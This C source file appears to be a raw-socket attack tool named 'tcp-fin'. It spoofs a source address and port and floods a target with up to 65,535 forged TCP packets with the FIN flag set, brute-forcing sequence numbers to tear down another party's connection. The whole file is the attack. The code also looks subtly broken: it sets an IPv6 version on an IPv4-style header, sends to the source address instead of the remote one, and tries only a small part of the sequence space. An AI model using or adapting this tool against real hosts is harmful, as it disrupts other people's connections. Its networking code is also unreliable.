#include "ip-headers.h"
#include "ip-constructors.c"
#include "applications.c"
#include "constants.h"

// Arguments standarized and checked //
// Respects executable [[--source-addr saddr] [--[remote|broadcast]-addr raddr] [--source-port sport] [--remote-port rport] [--n N]] /Y

int main(int argc,char* argv[]){
    if(argc!=9){ fprintf(stdout,"Usage: tcp-fin --source-addr saddr --remote-addr raddr --source-port port --remote-port port\n"); exit(0); }
	else{	
		
		/** Example source address and source port **/
		char* source_address = argv[2];
		char* source_port    = argv[6];
		char* remote_address = argv[4];
		char* remote_port    = argv[8];

		/** Obtain the socket**/
		int sock = get_socket_descriptor_raw_tcp();
		/** Create buffer for your packets **/
		char buffer[DEFAULT_PCKT_LEN]; memset(buffer,0,DEFAULT_PCKT_LEN);
	
		/**Init sockaddr_in with my network information (Only if it's necessary, there are functions in applications that spoofs your addr)**/
		struct sockaddr_in myaddr;
		set_sockaddr_in(&myaddr,source_address,source_port);

		/** Create your headers and make your combinations **/
		IP_HEADER *ip_hdr   = (IP_HEADER *)buffer;
		TCP_HEADER *tcp_hdr = (TCP_HEADER *)(buffer + sizeof(IP_HEADER));

		/** Fill your headers (IP && TCP in this case) **/
		set_ip_header(ip_hdr,IP_VERSION_V6,IP_DEFAULT_IHL,IP_CURRENT_TOS,IP_DEFAULT_IDENTIFICATION,0,0,0,\
			      IP_DEFAULT_FRAGMENT_OFFSET,IP_DEFAULT_TTL,IP_TCP_PROTOCOL,0,source_address,remote_address,0);

		/** Use auxiliar functions to warn of current status **/
		SHOW_CREATED_IP_HEADER(ip_hdr);
		
		//SHOW_CREATED_TCP_HEADER(tcp_hdr);

		/** Notice the kernel that we doesn't need it fill the header **/
		if(kernel_not_fill_my_header(sock)<0){fprintf(stderr,"Is not possible to notice the kernel"); exit(0);}
		
		/** Application (Flag FIN ON,bruteforce at packet number and source port guessed) **/
		unsigned int i,count=0;
		for(i=0;i<65535;i++){
			set_tcp_header(tcp_hdr,source_port,remote_port,i,0,TCP_DEFAULT_OFFSET,TCP_DEFAULT_RESERVED,1,0,0,0,0,0,0,0, \
			       TCP_DEFAULT_WINDOW,0,0,buffer);
			if(sendto(sock, buffer, ip_hdr->total_length, 0, (struct sockaddr*)&myaddr, sizeof(myaddr))>=0) count++;
		}
		fprintf(stdout,"Thrown %d requests to check sequence number\n",count);
	}
	
	
	return 0;
}

